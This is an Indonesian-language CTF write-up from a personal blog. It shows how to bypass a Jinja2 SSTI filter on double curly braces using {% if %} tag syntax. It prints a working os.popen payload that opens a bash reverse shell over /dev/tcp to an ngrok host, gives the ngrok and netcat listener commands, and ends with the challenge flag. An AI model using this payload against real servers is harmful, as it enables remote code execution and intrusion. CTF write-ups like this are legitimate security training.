---
layout: page
title: "Server-Side Template Injection (SSTI) - Jinja2"
categories: ctf
---

<div class="post-categories">
  {% if post %}
    {% assign categories = post.categories %}
  {% else %}
    {% assign categories = page.categories %}
  {% endif %}
  <strong>Categories: </strong>
  {% for category in categories %}
  <a href="{{site.baseurl}}/categories/#{{category|slugize}}">{{category}}</a>
  {% unless forloop.last %}&nbsp;{% endunless %}
  {% endfor %}
</div>

Pada blog ini, saya akan membagikan cara untuk bypass filtered input SSTI Jinja2 dengan requirements:

- Memungkinkan SSTI
- Double curly brackets atau dobel kurung kurawal \{\{ di filter

Jadi yang pertama kali saya lakukan, masuk ke halaman web yang memungkinkan untuk kita melakukan SSTI
![](/assets/img/Screenshot 2022-10-24 233937.png)

Selanjutnya gunakan payload berikut ini

```
{% raw %}
{% if(config.class.init.globals['os'].popen('bash -c "exec bash -i &>/dev/tcp/{ip_public}/port <&1"')) %}{% endif %}
{% endraw %}
```

Jadi, pada payload diatas, kita akan mengirimkan request yang bertujuan untuk mengirim shell target ke shell kita melalui ip public pada `/dev/tcp/{ip_public}/{port}`

Nah, jadi kalian bisa mengganti `{ip_public} ` dan `{port}` dengan service forward port gratis seperti netlify, ngrok, dan lainya.<br />

Jika kalian menggunakan ngrok, bisa gunakan perintah ini `ngrok tcp {listening_port}`
![](/assets/img/Screenshot 2022-10-25 001613.png)
<br /> `{listening_port}` akan kita gunakan untuk mendapatkan shell yang dikirim melalui domain dan port yang didapatkan dari ngrok, jangan lupa untuk gunakan perintah `nc -tlvp {listening_port}` untuk mendapatkan shell target. <br />

Berdasarkan gambar diatas, maka payload yang harus dimasukkan adalah

```
{% raw %}
{% if(config.class.init.globals['os'].popen('bash -c "exec bash -i &>/dev/tcp/0.tcp.ap.ngrok.io/18104 <&1"')) %}{% endif %}
{% endraw %}
```

![](/assets/img/Screenshot 2022-10-25 004110.png)

Dan didapatlah flagnya `BEECTF{3s_3s_t1_a1_Gg3Z_h3h3_g12l2bi30l}`
